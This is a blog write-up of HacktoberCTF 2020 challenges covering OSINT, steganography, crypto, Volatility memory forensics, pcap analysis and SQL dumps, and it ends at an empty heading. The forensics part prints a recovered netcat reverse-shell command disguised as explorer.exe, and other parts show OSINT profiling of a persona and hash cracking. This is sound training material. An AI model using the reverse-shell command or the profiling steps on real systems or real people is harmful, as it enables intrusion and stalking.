---
title: "CTF - HacktoberCTF"
categories: [ctf]
date: 2020-10-16
hasComments: true
image: /images/walkthroughs/hackthebox/traceback/traceback_logo.png
description: CTF - HacktoberCTF
---

# HacktoberCTF 2020

<p align="center">
  <img src="/images/writeups/HacktoberCTF/1_logo.png" width="300"/>
</p>

I participate in this CTF for team [ISwearIGoogledIt](https://ctftime.org/team/109689) and got some challenges:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/2_rank.png" width="500"/>
</p>

Thanks to [RazviOverflow](https://razvioverflow.github.io) to show up, even with his tight schedule he could find some time for this.

I found this CTF really fun, with entry level challenges and other hard ones. Let's get into it!

---

# Web Exploitation

## What Lies in the Shadows
200
syyntax web

Based on ghosttown discussions, DEADFACE has a secret website they tell their new recruits about. Somewhere on that site is a hidden flag that we need you to grab. Submit the flag as flag{flag_text}.

I checked out spookyboi profile and found this [thread](https://www.ghosttown.xyz/t/trick-or-treat-smell-my-feet/52/5) then it talks about this [pastebin](https://pastebin.com/vbQZ7xwL).

```323epprcunnvtibo6no7libdxopwcaqgorho6slmpos7fimetb4zskad```


56 length and those alphanumeric... Seems like an .onion domain, head over to TOR Browser:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/Web/1_onion.png" width="500"/>
</p>

Looking around the website we see nothing, went to the DevConsole and checked the JS where we could see the flag:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/Web/2_js.png" width="500"/>
</p>

```flag{w3lcome_t0_d34df4ce}```

---

# OSINT

## Creeping 1
10
syyntax

Ali Tevlin is quite active on Ghost Town and we believe he's behind some of the recent attacks on De Monne Financial. See what you can find out about him on the internet - it might give us an idea about why he's targeting De Monne Financial.

What company does Ali Tevlin work for? Submit the flag in this format: flag{Little Shop of Horrors}

In this challenge we can see the name Ali Tevlin, one or the organizers of the CTF. 

<p align="center">
  <img src="/images/writeups/HacktoberCTF/OSINT/Creeping/1_hack.png" width="500"/>
</p>

We will check out [Sherlock](https://github.com/sherlock-project/sherlock) tool for username _alitevlin_, in the meantime, we went to Google where appeared some ontributions from that username on GhostTown forum. At the time I get into this forums, sherlock show up that the username was found on Facebook.

<p align="left">
  <img src="/images/writeups/HacktoberCTF/OSINT/Creeping/2_google.png" width="500"/>
</p>

<p align="right">
  <img src="/images/writeups/HacktoberCTF/OSINT/Creeping/3_sher.png" width="500"/>
</p>

On Facebook we can see the company he is working for.

<p align="center">
  <img src="/images/writeups/HacktoberCTF/OSINT/Creeping/4_facebook.png" width="500"/>
</p>

```flag: flag{F. Kreuger Financial}```



## Creeping 2
10
syyntax

Based on what you've been able to discover about Ali Tevlin, tell us what his position is at his current company.

Submit the flag in the following format: flag{Chief Executive Officer}

From the previous Facebook screenshot, we can see his position at the company:

```flag: flag{Senior Acquisitions Supervisor}```



## Creeping 3
10
syyntax

For claiming to be part of a hacker group as dangerous as DEADFACE, I'm surprised how much sensitive information Ali posts online. Based on the information you've been able to gather on Ali Tevlin, what date was he born?

Submit the flag in the following format: flag{dd mmm yyyy}.

On his facebook we can check his first post were the birthdate can be spotted:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/OSINT/Creeping3/1_date.png" width="500"/>
</p>

```flag: flag{17 jun 1973}```



## Creeping 4
30
syyntax OSINT

Ali Tevlin went on vacation in August. Based on his social media activity, which town did he stop in first? Submit the flag as flag{City, State}.

Example: flag{Albany, NY}

We can see this [statue](https://www.facebook.com/photo/?fbid=126468515816065&set=a.126468555816061) and with google lens we can see that its the mothman statue. It is close to the Mothman Museum.

<p align="center">
  <img src="/images/writeups/HacktoberCTF/OSINT/Creeping4/1_museum.png" width="500"/>
</p>

```flag{Point Pleasant, WV}```



## Past Attacks
20
nmott131

Author: nmott131

Knowing that it is going to be an attack against a Financial firm. What is the type of attack that is likely to happen? Enter the answer as flag{word word}.

I got two hints:

Google: _attack that has hit financial institutions poland_

I got this [website](https://securereading.com/malware-hit-polish-bank-targeted-more-than-100-financial-organizations/) were talks about an attack name watering hole.

```flag: flag{watering hole}```





---

# Steganography

I don't know why I got so stucked on this section. But learned somethings for the next one.

## Ghost Hunter
10
syyntax steganography

We intercepted this image from a user on Ghost Town. Some kind of tool was used to hide information in this image.

Link to Image

Nope

## You Believe in Ghosts?
30
syyntax

Check out this image Donnell Aulner posted on Ghost Town. There's probably something hidden in this image. Can you find it?

Link to Image

Nope

## Blasphemy
40
syyntax

We intercepted this image from a user on Ghost Town. Some kind of tool was used to hide a file in this image.

We downloaded a file and follow the sentence: Tool was used to hide. Maybe steghide? Let's check it out:

```
kali@kali:~/Desktop/CTFs/HacktoberCTF/Stego/Blasphemy$ steghide info witches.jpg 
"witches.jpg":
  format: jpeg
  capacity: 16.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "secret.txt.o":
    size: 39.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes

# Extract the info

kali@kali:~/Desktop/CTFs/HacktoberCTF/Stego/Blasphemy$ steghide extract -sf witches.jpg 
Enter passphrase: 
wrote extracted data to "secret.txt.o".

kali@kali:~/Desktop/CTFs/HacktoberCTF/Stego/Blasphemy$ bat secret.txt.o 
───────┬────────────────────────────────────────────────────────
       │ File: secret.txt.o
───────┼────────────────────────────────────────────────────────
   1   │ flag{950634ccc97ca3ef03e22c759a356973}
───────┴────────────────────────────────────────────────────────
```

There we have it:

```flag: flag{950634ccc97ca3ef03e22c759a356973}```



## Start Digging
100
syyntax steganography

There's a secret buried here, but we need help finding it. Supposedly, there's a flag hidden deep within this image. But how far down do we need to dig?

We got an image. Exiftools didn't show up anything. Let's go with binwalk:

```
kali@kali:~/Desktop/CTFs/HacktoberCTF/Stego/StartDigging$ binwalk -e --dd=.* steg06.jpg
kali@kali:~/Desktop/CTFs/HacktoberCTF/Stego/StartDigging/_steg06.jpg.extracted$ ls
0  1CC3B  1CC47  1CCF3  1CCFF  C
```
The one named 1CC3B showed the following:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/OSINT/StartDigging/1_flag.png" width="500"/>
</p>

```flag: flag{buried_s3cr3ts}```



## Boney Boi Breakdance
150
syyntax steganography

We intercepted this image from a known DEADFACE affiliate. Some kind of tool was used to hide a file in this image. Unlike some of the other, easier images that used steganography, this one appears to require a passphrase. I bet it's somehow related to the image used to hide the file.

Link to Image

Nope






---

# Crypto

## Hail Caesar!
10
syyntax crypto

This image was found in Ghost Town along with the encoded message below. See if you can decipher the message. Enter the entire decoded message as the flag.

Decode this: TGG KUSJWV QGM

We can use [dCode](https://www.dcode.fr/caesar-cipher) and paste the text. We can see that +18 leads into: BOO SCARED YOU

```flag: flag{BOO SCARED YOU}```



## Down the Wrong Path
10
syyntax crypto

One of our operatives took a photo of a notebook belonging to Donnell. We think it's a message intended for another member of DEADFACE. Can you decipher the message and tell us who it's intended for?

Download Image

We can see there is some text in the image:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/Crypto/DownTheWrongPath/crypto02.png" width="500"/>
</p>

```
RMTLOBBTERSUXT
EBOLOOOHWGORTA
METSKIUETEFNAC
EREPYATNATOETK
```

Okey, don't panic, it took me 10 min to realize it was ment to be readed from top to bottom, not from left to right ^^'.

``` 
REMEMBER TO TELL SPOOKY BOI ABOUT THE NEW TARGET SO FOUR NEXT ATTACK
```

Who it's intended for?

```flag: flag{SPOOKY BOI}```



## Cover Your Bases
30
syyntax

One of the other junior analysts stumbled upon this and isn't quite sure what to make of it. Based on the context that it was found, it might be a coded message.

Decode this: ZmxhZ3tzaG91bGRhX21hZGVfdGhpc19vbmVfaGFyZGVyfQ==

A quick base64 on [CyberChef](https://gchq.github.io/CyberChef/):

```flag{shoulda_made_this_one_harder}```



## Bone to Pick
80
syyntax

We intercepted network traffic between two suspected DEADFACE actors. The problem is, we have no idea what we're looking at. We think it might have critical information. See if you can find the critical information from the link below and submit the flag.

Link to String

```
_9j_4AAQSkZJRgABAQEAeAB4AAD_4QAiRXhpZgAATU0AKgAAAAgAAQESAAMAAAABAAEAAAAAAAD_2wBDAAIBAQIBAQICAgICAgICAwUDAwMDAwYEBAMFBwYHBwcGBwcICQsJCAgKCAcHCg0KCgsMDAwMBwkODw0MDgsMDAz_2wBDAQICAgMDAwYDAwYMCAcIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAz_wAARCALQA-ADASIAAhEBAxEB_8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL_8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4-Tl5ufo6erx8vP09fb3-
...
```
It can be like base64, lets go to [CyberChef](https://gchq.github.io/CyberChef/) and we can see like an image magic bytes:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/Crypto/BoneToPick/1_base64.png" width="500"/>
</p>

Let's render it:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/Crypto/BoneToPick/index.png" width="500"/>
</p>

```flag: flag{angrybones}```



## Shoeless Hellhole
300
syyntax

Have you taken a look at Ghost Town lately? It sounds like DEADFACE met up earlier this week. They gave an address, but that doesn't look like any address I've ever seen before. I bet it's an encrypted message. See if you can find out how to decrypt the message. Submit the name of the location as the flag (Example: flag{Empire State Building})

Here's the message: 1c0b4f9a4c18130dc631186fd7356bd1e7ca8f75623382bca6aaa60d9482785d

We can see where is that [post](https://www.ghosttown.xyz/t/no-treats-just-tricks/37) and it has 64 characters... Also on the post says that there is something left. I spent some time on it but couldn't solve it :(





---

# Forensics

We went hard on volatility, definitely worth the time spent with this tool. The following task seemed like a real-case scenario for me. 

## Captured Memories
30
syyntax

We found some unusual activity coming from an employee's Windows 10 workstation at De Monne Financial. Our IT guy saved the memory dump to the file provided below. What was the PID of the program used to capture the memory dump? Submit the flag as flag{PID}.

Link to memory dump file

We can see a 2GB dump. We can use [Volatility](https://tools.kali.org/forensics/volatility) to analyze the content. For this task, we know that the dump was captured on a Windows 10 machine, we will select Windows 10 x64 profile among the [availables](https://github.com/volatilityfoundation/volatility/wiki/2.6-Win-Profiles), if doesn't work, we try x32.

**Note: The previous affirmation led to 2 hour waste for choosing wrong profile, please, running imageinfo option of volatility could save me from that mistake ^^'. You can see that choosing the wrong profile had as consequence a partial and misleading interpretation of the memdump. Leason learned.**

On the following command, pslist will display the process running at the moment of the dump.

```
kali@kali:~/Desktop/CTFs/HacktoberCTF/Forensic/CapturedMemories$ volatility pslist --profile=Win10x64_10586 -f mem.raw 
Volatility Foundation Volatility Framework 2.6
Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0xffff87868e88d438 --------------------      4      0 24...4        0 ------      0 6285-08-11 06:06:22 UTC+0000                                 
0xffff87868e975038 --------------------     88      0 24...8        0 ------      0 6228-07-11 06:16:00 UTC+0000                                 
0xffff878690147038  ??????smss.exe        348      0 24...2        0 ------      0 6235-10-10 13:14:27 UTC+0000                                 
0xffff878690722078 ?'?????csrss.ex        436      0 24...4        0 ------      0 6236-08-31 00:21:17 UTC+0000                                 
...                                                          
0xffff87868f047078 --------------------   6044    276 24...6        0 ------      0 6236-07-21 07:00:39 UTC+0000                                 
0xffff87868ebef078 ????????chrome.e       2512    540 24...4        0 ------      0 6236-07-21 07:00:39 UTC+0000                                 
0xffff87868f2e1078 ????????winpmem_       3348    332 23...6        0 ------      0 6236-07-21 07:00:39 UTC+0000 
```

We can look for memory capture tools on windows 10, and we decided to check the string 'mem' and 'dmp' to look for it. We can check out the last process [winpmem](https://github.com/google/rekall/tree/master/tools/windows/winpmem) can be out target. Therefore:

```flag: flag{3348}```



## AmCaching In
50
Killam

The amcache can be a pretty handy tool to help build out a timeline of execution during an investigation, and is always located in \%SystemRoot%\AppCompat\Programs\Amcache.hve what was the application installed by the user mpowers?
Submit the flag as flag{program}.
Link to file

We will use [AmcacheParser](https://github.com/EricZimmerman/AmcacheParser) on Windows 10. We get the exe file from [here](https://ericzimmerman.github.io/#!index.md).

<p align="center">
  <img src="/images/writeups/HacktoberCTF/Forensic/AmCachingIn/1_ps.png" width="500"/>
</p>

```
PS C:\Users\Kashmir\Desktop> .\AmcacheParser.exe -f .\Amcache.hve --csv .\
```

We got a bunch of csv, we are looking for "mpowers" user, so we get them on our linux and introduce this commands:

```
kali@kali:~/Desktop/CTFs/HacktoberCTF/Forensic/AmCachingIn/Amcache$ strings * | grep "mpowers" > output.txt

Unassociated,0006628dec5d62d45266dbd56fe25638289800000904,2018-07-23 13:38:02,5e774c390146ef62fa64ff83fd3143699711e948,False,c:\users\mpowers\downloads\python-3.7.0-amd64-webinstall.exe,python-3.7.0-amd64-webinstall.exe,.exe,2017-11-18 22:00:38,python 3.7.0 (64-bit),1327160,3.7.150.0,3.7.150.0,python-3.7.0-amd|22280f4895ff683e,pe32_i386,True,3.7.150.0,3.7.150.0,1033,
Unassociated,0006628dec5d62d45266dbd56fe25638289800000904,2018-07-23 13:38:23,2d64d4af1f91189e1cb568df2f6dcbf4414702ff,False,c:\users\mpowers\appdata\local\temp\4\{b04d01b2-0174-4ef5-8fb5-84584c0964f5}\.be\python-3.7.0-amd64-webinstall.exe,python-3.7.0-amd64-webinstall.exe,.exe,2017-11-18 22:00:38,python 3.7.0 (64-bit),839416,3.7.150.0,3.7.150.0,python-3.7.0-amd|a300d7e97250c2b4,pe32_i386,True,3.7.150.0,3.7.150.0,1033,
Unassociated,0006628dec5d62d45266dbd56fe25638289800000904,2018-07-23 13:38:18,2d64d4af1f91189e1cb568df2f6dcbf4414702ff,False,c:\users\mpowers\appdata\local\temp\4\{4a1d9cda-5382-4f04-b44d-51927f9c602a}\.cr\python-3.7.0-amd64-webinstall.exe,python-3.7.0-amd64-webinstall.exe,.exe,2017-11-18 22:00:38,python 3.7.0 (64-bit),839416,3.7.150.0,3.7.150.0,python-3.7.0-amd|fa41cf1964649b2b,pe32_i386,True,3.7.150.0,3.7.150.0,1033,
Unassociated,0006c7ceeec1327cc6910fc8e416acd3e06b00000904,2018-08-08 05:21:15,4acc66f0869d5e59802961bee0f1bea38bad6fdf,False,c:\users\mpowers\desktop\sub-win-x64_104.148.109.124_5682_3262.exe,sub-win-x64_104.148.109.124_5682_3262.exe,.exe,2018-04-10 
```

We can see the program installed was python:

```flag: flag{python}```



## Prefetch Perfection
50
Killam

Prefetch files are another handy tool to show evidence of execution. What time was Internet Explorer opened? (GMT) Submit the flag as flag{YYYY-MM-DD HH:MM:SS}.

Download file

Get some Nirsoft tool like [win prefetch view](http://www.nirsoft.net/utils/win_prefetch_view.html), set it on our desktop and set the folder to the one downloaded:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/Forensic/PrefetchPerfection/1_folder.png" width="500"/>
</p>

Checking the last run date on the details:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/Forensic/PrefetchPerfection/2_iexplorer.png" width="500"/>
</p>

Ok. I got that flag wrong, thankfully, I had [@Razvi](https://razvioverflow.github.io/) and spotted the error.

```flag: flag{2017-05-01 23:11:41}```



## Evil Twin
150
syyntax

One of the junior analysts thinks that there is a duplicate process - an "evil twin" - masquerading as a legitimate process. What is the name of the malicious process? Submit the flag as flag{process_name.ext}

Use the file from Captured Memories.

A great [guide](https://medium.com/@zemelusa/first-steps-to-volatile-memory-analysis-dcbd4d2d56a1)

This took me a long time to get due to the aforementioned mistake of not running **imageinfo**. We are using volatility, and also malprocfind plugin. First, retrieve [volatility](https://github.com/volatilityfoundation/volatility), then inside that folder clone the plugin from [malprocfind](https://github.com/csababarta/volatility_plugins/blob/ca4b269ac9eb5c37e861cf6e16949c4c8683387a/malprocfind.py) github page. Then use it with --plugins option. 

**IMPORTANT** use --plugins at first in the command. If you use it at the end, won't work. Also important, use the correct profile for the file, to know it, run this first command and use the first recommended profile:


```
kali@kali:/opt/volatility$ python vol.py -f ~/Desktop/CTFs/HacktoberCTF/Forensic/CapturedMemories/mem.raw imageinfo

# First recommended profile: Win10x64_17134

kali@kali:/opt/volatility$ python vol.py --plugins="./volatility_plugins" -f ~/Desktop/CTFs/HacktoberCTF/Forensic/CapturedMemories/mem.raw --profile=Win10x64_17134 malprocfind 
Volatility Foundation Volatility Framework 2.6.1
Offset             ProcessName     PID   PPID  Name  Path  Priority  Cmdline User  Sess  Time  CMD   PHollow SPath
------------------ --------------- ----- ----- ----- ----- --------- ------- ----- ----- ----- ----- ------- -----
WARNING : volatility.debug    : NoneObject as string: Invalid offset 18446656176336377392 for dereferencing Buffer as String
0xffff87868e88d440 system              4 True  True  True  True      True    True  None  True  True  True    True 
0xffff878690495080 wininit.exe       528 True  True  True  True      True    True  True  True  True  True    True 
0xffff878690c8d580 svchost.exe      1052 True  True  True  True      False   True  True  True  True  True    True 
...
0xffff878690722080 csrss.exe         436 True  True  True  True      True    True  True  True  True  True    True 
0xffff878690c07080 dwm.exe           968 False True  True  True      False   True  True  True  True  True    True 
0xffff878690dc3580 svchost.exe      1312 True  True  True  True      False   True  True  True  True  True    True 
0xffff878690472280 csrss.exe         508 True  True  True  True      True    True  True  True  True  True    True 

Unusual process counts:
-----------------------
Warning! More than 1 explorer.exe process! (3) (That usually means that multiple users are logged in.)

Processes without running parent process:
-----------------------------------------
PID 5936 Offset: 0xffff8786910be080 Name: GoogleCrashHan
PID 4 Offset: 0xffff87868e88d440 Name: System
PID 5448 Offset: 0xffff878691762080 Name: explorer.exe
PID 4332 Offset: 0xffff878691061580 Name: GoogleCrashHan
PID 2316 Offset: 0xffff8786913f9580 Name: explorer.exe
PID 528 Offset: 0xffff878690495080 Name: wininit.exe
PID 564 Offset: 0xffff87869049c580 Name: winlogon.exe
PID 5432 Offset: 0xffff87868fd63580 Name: conhost.exe
PID 436 Offset: 0xffff878690722080 Name: csrss.exe
PID 508 Offset: 0xffff878690472280 Name: csrss.exe
```

Okey, we could see 3 process duplicated, we check each one with the following commands:

```
kali@kali:/opt/volatility$ python vol.py -f ~/Desktop/CTFs/HacktoberCTF/Forensic/CapturedMemories/mem.raw --profile=Win10x64_17134 dlllist -p 2316
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
explorer.exe pid:   2316
Command line : C:\Windows\Explorer.EXE

Base                             Size          LoadCount LoadTime                       Path
------------------ ------------------ ------------------ ------------------------------ ----
0x00007ff6aea00000           0x3bd000             0xffff 2020-06-26 15:08:57 UTC+0000   C:\Windows\Explorer.EXE
0x00007ffbba950000           0x1e1000             0xffff 2020-06-26 15:08:57 UTC+0000   C:\Windows\SYSTEM32\ntdll.dll
...


kali@kali:/opt/volatility$ python vol.py -f ~/Desktop/CTFs/HacktoberCTF/Forensic/CapturedMemories/mem.raw --profile=Win10x64_17134 dlllist -p 5448
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
explorer.exe pid:   5448
Command line : explorer.exe  -lnvp 6666

Base                             Size          LoadCount LoadTime                       Path
------------------ ------------------ ------------------ ------------------------------ ----
0x0000000000400000             0xe000             0xffff 2020-06-26 15:43:14 UTC+0000   C:\Windows\system32\explorer.exe
0x00007ffbba950000           0x1e1000             0xffff 2020-06-26 15:43:14 UTC+0000   C:\Windows\SYSTEM32\ntdll.dll
...
```

Check out the command line of the last explorer.exe with the -lnvp 6666... seems like malicious. Therefore:

```flag: flag{explorer.exe}```



## Hell Spawn 1
100
syyntax

What was the name of the process that spawned the malicious explorer.exe? Submit the flag as the name and extension of the process and the PID of the process, separated by an underscore: flag{process_name.ext_PID}

Use the file from Captured Memories.

Malicious explorer had PID 5448:

```
kali@kali:/opt/volatility$ python vol.py -f ~/Desktop/CTFs/HacktoberCTF/Forensic/CapturedMemories/mem.raw --profile=Win10x64_17134 pstree
Volatility Foundation Volatility Framework 2.6.1
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xffff87868e88d440:System                              4      0    111      0 2020-06-26 15:07:32 UTC+0000
. 0xffff878690147040:smss.exe                         348      4      2      0 2020-06-26 15:07:32 UTC+0000
. 0xffff87868e975040:Registry                          88      4      3      0 2020-06-26 15:07:23 UTC+0000
. 0xffff878690ccc040:MemCompression                  1168      4     50      0 2020-06-26 15:07:58 UTC+0000
 0xffff878690495080:wininit.exe                       528    424      1      0 2020-06-26 15:07:45 UTC+0000
. 0xffff8786904cd080:services.exe                     648    528      6      0 2020-06-26 15:07:46 UTC+0000
.. 0xffff87869150c580:sedsvc.exe                     3040    648      5      0 2020-06-26 15:17:18 UTC+0000
.. 0xffff87868ede8580:SearchIndexer.                 4448    648     23      0 2020-06-26 15:09:31 UTC+0000
... 0xffff87868ec27080:cmd.exe                       6844   4448      0 ------ 2020-06-26 15:44:35 UTC+0000
... 0xffff878690744380:SearchProtocol                4396   4448      0 ------ 2020-06-26 15:50:01 UTC+0000
... 0xffff87868f082580:SearchFilterHo                4432   4448      4      0 2020-06-26 15:50:01 UTC+0000
... 0xffff878691456080:cmd.exe                       3944   4448      0 ------ 2020-06-26 15:37:19 UTC+0000
.... 0xffff87868fd63580:conhost.exe                  5432   3944      4      0 2020-06-26 15:37:19 UTC+0000
.... 0xffff878691762080:explorer.exe                 5448   3944      1      0 2020-06-26 15:43:14 UTC+0000
... 0xffff878691457580:cmd.exe                       4424   4448      1      0 2020-06-26 15:46:51 UTC+0000
.... 0xffff87868f773080:explorer.exe  ------         3100   4424      5      0 2020-06-26 15:48:21 UTC+0000
..... 0xffff87868f77b340:cmd.exe                     4640   3100      1      0 2020-06-26 15:48:21 UTC+0000
.... 0xffff87868f998080:conhost.exe                  6372   4424      3      0 2020-06-26 15:46:51 UTC+0000
.. 0xffff87868ed40580:svchost.exe                    4976    648      3      0 2020-06-26 15:48:59 UTC+0000
.. 0xffff878690b71580:svchost.exe                     884    648     25      0 2020-06-26 15:07:53 UTC+0000

```

We can get the PPID of the explorer.exe and the process with that PID is cmd.exe:

```flag: flag{cmd.exe_3944}```



## Hell Spawn 2
125
syyntax forensics

What is the MD5 hash of the malicious explorer.exe file from Evil Twin?

Use the file from Captured Memories.

Check bonus challenge: Public Service where I retrieved the MD5 hash:

```flag: flag{360b48f831d9beb41544b45d0aa66b8a}```



## Commands
100
syyntax

What was the command used with the malicious explorer.exe? Submit the entire command as the flag: flag{program.exe --options argument}.

Use the file from Captured Memories.

```
kali@kali:/opt/volatility$ python vol.py -f ~/Desktop/CTFs/HacktoberCTF/Forensic/CapturedMemories/mem.raw --profile=Win10x64_17134 cmdline
Volatility Foundation Volatility Framework 2.6.1                                                                             
************************************************************************
System pid:      4
************************************************************************
Registry pid:     88
************************************************************************
smss.exe pid:    348
Command line : \SystemRoot\System32\smss.exe
************************************************************************
...
explorer.exe pid:   5448
Command line : explorer.exe  -lnvp 6666
************************************************************************
explorer.exe pid:   3100
Command line : explorer.exe  192.168.1.157 6666 -e cmd.exe
************************************************************************
```

Here we can see the commands executed with _cmdline_ option from volatility, there we could see the command:

```flag: flag{explorer.exe  192.168.1.157 6666 -e cmd.exe}```





---

# Bonus

## Public Service
100

There is a flag associated with the malicious process from Evil Twin on a popular site used to check malware hashes. Find and submit that flag.

For this task, we will retrieve the executable and calculate its hash for looking for it on virustotal for example.

```
kali@kali:/opt/volatility$ python vol.py --profile=Win10x64_17134 -f ~/Desktop/CTFs/HacktoberCTF/Forensic/CapturedMemories/mem.raw procdump -p 5448 --dump-dir ~/Desktop/CTFs/HacktoberCTF/Forensic/CapturedMemories
Volatility Foundation Volatility Framework 2.6.1
Process(V)         ImageBase          Name                 Result
------------------ ------------------ -------------------- ------
0xffff878691762080 0x0000000000400000 explorer.exe         OK: executable.5448.exe

kali@kali:~/Desktop/CTFs/HacktoberCTF/Forensic/CapturedMemories$ md5sum executable.5448.exe 
360b48f831d9beb41544b45d0aa66b8a  executable.5448.exe
```

We go to [VirusTotal](https://www.virustotal.com/gui/file/096740ce1bc9fa14ab07c16efd21fd946b7e966dbc1fe66ce02f5860911c865e/community) and we can check a community comment with the flag:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/Forensic/CapturedMemories/1_comment.png" width="500"/>
</p>

```flag: flag{h4cktober_ctf_2020_nc}```






---

# Traffic Analisys

## Remotely Administrated Evil
20
malware_traffic Killam

Author: malware_traffic, Killam

What is the name of the executable in the malicious url? Submit the filename as the flag: flag{virus.bad}.

Download file

On wireshark we can check out the HTTP GET request:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/TrafficAnalysis/RemotelyAdministratedEvil/1_name.png" width="500"/>
</p>

```flag: flag{solut.exe} ```



## Evil Corp's Child
20
malware_traffic Killam

What is the MD5 hash of the Windows executable file?

NOTE If you extract any files within this challenge, please delete the file after you have completed the challenge.

Download file - Password hacktober

We can analyze the pcap file and find an HTTP Object, we can extract it and calculate the MD5:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/TrafficAnalysis/Evil/1_export.png" width="500"/>
</p>

Of course it wasn't an image:

```
kali@kali:~/Desktop/CTFs/HacktoberCTF/TrafficAnalysis/Evil$ file picture4.png 
picture4.png: PE32 executable (GUI) Intel 80386, for MS Windows

kali@kali:~/Desktop/CTFs/HacktoberCTF/TrafficAnalysis/Evil$ md5sum picture4.png 
a95d24937acb3420ee94493db298b295  picture4.png
```

```flag: flag{a95d24937acb3420ee94493db298b295} ```



## An Evil Christmas Carol
20
jasonkillam1 malware_traffic

A malicious dll was downloaded over http in this traffic, what was the ip address that delivered this file?

Link to file - Password: hacktober

We can check on the analysis the dll downloaded and the IP used to make the request:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/TrafficAnalysis/BoneToPick/1_export.png" width="500"/>
</p>

```flag: flag{205.185.125.104}```



---

# SQL

## Past Demons
30
SQL crypto syyntax

We've had a hard time finding anything on spookyboi. But finally, with some search engine finessing, an analyst found an old, vulnerable server spookyboi used to run. We extracted a database, now we need your help finding the password. Submit the password as the flag: flag{password}.

Download file

I'm going easy on this. Used [sqlitebrowser](https://github.com/sqlitebrowser/sqlitebrowser/releases/tag/v3.11.0-beta3) for windows, checked the tables and see that spookyboi was UID = 8. Then went to the passwords table and retrieve the password:

<p align="center">
  <img src="/images/writeups/HacktoberCTF/SQL/BoneToPick/1_users.png" width="500"/>
</p>

<p align="center">
  <img src="/images/writeups/HacktoberCTF/SQL/BoneToPick/2_pass.png" width="500"/>
</p>

We got like an MD5 hash. Head to [crackstation](https://crackstation.net/) and retrieve the password:

```flag: flag{zxcvbnm}```



## Address Book
50
syyntax sql

Shallow Grave University has provided us with a dump of their database. Find luciafer's email address and submit it as the flag in this format: flag{username@email.com}

Link to File

We got a sql file, let's create a local database with MySQL and import it:

```
kali@kali:~/Desktop/CTFs/HacktoberCTF$ sudo mysql -u root -p

mysql> CREATE DATABASE shall;
mysql> exit

sudo mysql -u root -p shall < shallowgraveu.sql

mysql> use shall;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> describe users;
+----------+-------------+------+-----+---------+----------------+
| Field    | Type        | Null | Key | Default | Extra          |
+----------+-------------+------+-----+---------+----------------+
| user_id  | int         | NO   | PRI | NULL    | auto_increment |
| username | varchar(52) | NO   | UNI | NULL    |                |
| first    | varchar(52) | NO   |     | NULL    |                |
| last     | varchar(52) | NO   |     | NULL    |                |
| middle   | varchar(24) | YES  |     | NULL    |                |
| email    | varchar(52) | NO   | UNI | NULL    |                |
| street   | varchar(52) | NO   |     | NULL    |                |
| city     | varchar(52) | NO   |     | NULL    |                |
| state_id | int         | NO   | MUL | NULL    |                |
| zip      | varchar(10) | NO   |     | NULL    |                |
| gender   | varchar(8)  | NO   |     | NULL    |                |
| dob      | date        | NO   |     | NULL    |                |
+----------+-------------+------+-----+---------+----------------+
12 rows in set (0.00 sec)

mysql> select email from users where first="LUCIA";
+-----------------------------------+
| email                             |
+-----------------------------------+
| luc1afer.h4vr0n@shallowgraveu.com |
+-----------------------------------+
1 row in set (0.00 sec)

```

We can look up with the name and retrieve the email:

```flag: flag{luc1afer.h4vr0n@shallowgraveu.com} ```



## Body Count
25
syyntax SQL

How many users exist in the Shallow Grave University database? Submit the flag in the following format: flag{#}

Use the file from Address Book.

```
mysql> select count(*) from users;
+----------+
| count(*) |
+----------+
|      900 |
+----------+
1 row in set (0.00 sec)
```

```flag: flag{900}```



## Null and Void
25
syyntax SQL

Author: syyntax

Using the Shallow Grave SQL dump, which field(s) in the users table accepts NULL values? Submit the field name followed by the single command used to show the information (separated by a comma). Submit the flag as flag{column-name, command}.

Example: flag{employee_id, SELECT}

Use the file from Address Book.

```
mysql> describe users;
+----------+-------------+------+-----+---------+----------------+
| Field    | Type        | Null | Key | Default | Extra          |
+----------+-------------+------+-----+---------+----------------+
| user_id  | int         | NO   | PRI | NULL    | auto_increment |
| username | varchar(52) | NO   | UNI | NULL    |                |
| first    | varchar(52) | NO   |     | NULL    |                |
| last     | varchar(52) | NO   |     | NULL    |                |
| middle   | varchar(24) | YES  |     | NULL    |                |
| email    | varchar(52) | NO   | UNI | NULL    |                |
| street   | varchar(52) | NO   |     | NULL    |                |
| city     | varchar(52) | NO   |     | NULL    |                |
| state_id | int         | NO   | MUL | NULL    |                |
| zip      | varchar(10) | NO   |     | NULL    |                |
| gender   | varchar(8)  | NO   |     | NULL    |                |
| dob      | date        | NO   |     | NULL    |                |
+----------+-------------+------+-----+---------+----------------+
12 rows in set (0.00 sec)
```

We can see the NULL column set on the middle attribute:

```flag: flag{middle, DESCRIBE}```



## Calisota
75
syyntax SQL

